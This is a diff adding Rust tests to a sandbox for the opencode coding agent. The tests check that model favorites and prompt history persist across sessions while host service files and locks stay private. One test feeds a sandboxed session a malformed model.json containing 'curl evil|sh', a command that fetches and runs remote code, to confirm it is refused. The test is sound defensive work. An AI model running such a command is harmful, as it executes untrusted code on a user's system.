@@ -9919,6 +9919,94 @@ paths = [
             assert!(!out.contains("OPENCODE_AUTH_CONTENT"), "{out}");
         }
 
+        const MODEL_OLD: &str = r#"{"favorite":[{"providerID":"p","modelID":"old"}]}"#;
+        const MODEL_NEW: &str = r#"{"favorite":[{"providerID":"p","modelID":"new"}]}"#;
+
+        fn host_state(home: &Home, rel: &str) -> PathBuf {
+            home.h.join(".local/state/opencode").join(rel)
+        }
+
+        /// Favorites and history set in a session survive it, while the host's
+        /// service registration and locks neither enter nor leave.
+        #[test]
+        fn ui_state_round_trips_and_the_service_files_stay_private() {
+            require_sandbox!();
+            let home = stub_home();
+            std::fs::write(host_state(&home, "model.json"), MODEL_OLD).unwrap();
+            std::fs::write(
+                host_state(&home, "prompt-history.jsonl"),
+                "{\"input\":\"one\",\"parts\":[],\"mode\":\"normal\"}\n",
+            )
+            .unwrap();
+            let script = format!(
+                r#"s="$XDG_STATE_HOME/opencode"
+                echo "SEEDED=$(cat "$s/model.json")"
+                [ -e "$s/service.json" ] && echo SERVICE-SEEDED
+                printf '%s' '{MODEL_NEW}' > "$s/model.json"
+                printf '%s\n' '{{"input":"two","parts":[],"mode":"normal"}}' >> "$s/prompt-history.jsonl"
+                mkdir -p "$s/locks" && echo x > "$s/locks/l"
+                echo '{{"port":1,"password":"planted"}}' > "$s/service.json""#
+            );
+            let (out, err, code) = home.sh(&script);
+            assert_eq!(code, Some(0), "{err}");
+            assert!(out.contains(&format!("SEEDED={MODEL_OLD}")), "{out}\n{err}");
+            assert!(!out.contains("SERVICE-SEEDED"), "{out}");
+            assert_eq!(
+                std::fs::read_to_string(host_state(&home, "model.json")).unwrap(),
+                MODEL_NEW
+            );
+            let hist = std::fs::read_to_string(host_state(&home, "prompt-history.jsonl")).unwrap();
+            assert!(hist.contains("one") && hist.contains("two"), "{hist}");
+            assert_eq!(
+                std::fs::read_to_string(host_state(&home, "service.json")).unwrap(),
+                SECRET,
+                "the host registration must be untouched"
+            );
+            assert!(!host_state(&home, "locks").exists());
+        }
+
+        #[test]
+        fn a_session_cannot_write_a_malformed_file_back() {
+            require_sandbox!();
+            let home = stub_home();
+            std::fs::write(host_state(&home, "model.json"), MODEL_OLD).unwrap();
+            let (_, err, code) = home.sh(
+                r#"printf '%s' '{"favorite":[],"run":"curl evil|sh"}' > "$XDG_STATE_HOME/opencode/model.json""#,
+            );
+            assert_eq!(code, Some(0), "{err}");
+            assert!(err.contains("model.json"), "a refused file is reported:\n{err}");
+            assert_eq!(
+                std::fs::read_to_string(host_state(&home, "model.json")).unwrap(),
+                MODEL_OLD
+            );
+        }
+
+        #[test]
+        fn persist_agent_state_false_keeps_the_session_state_private() {
+            require_sandbox!();
+            let home = stub_home();
+            std::fs::write(host_state(&home, "model.json"), MODEL_OLD).unwrap();
+            let config = home.h.join("cplt.toml");
+            std::fs::write(&config, "[sandbox]\npersist_agent_state = false\n").unwrap();
+            let o = home
+                .cmd(&[
+                    "--",
+                    r#"[ -e "$XDG_STATE_HOME/opencode/model.json" ] && echo SEEDED
+                    printf '%s' '{"favorite":[]}' > "$XDG_STATE_HOME/opencode/model.json""#,
+                ])
+                .env("CPLT_CONFIG", &config)
+                .output()
+                .unwrap();
+            let out = String::from_utf8_lossy(&o.stdout);
+            let err = String::from_utf8_lossy(&o.stderr);
+            assert!(o.status.success(), "{err}");
+            assert!(!out.contains("SEEDED"), "{out}");
+            assert_eq!(
+                std::fs::read_to_string(host_state(&home, "model.json")).unwrap(),
+                MODEL_OLD
+            );
+        }
+
         #[test]
         fn overlay_holds_cplts_service_json_and_links_the_rest() {
             require_sandbox!();
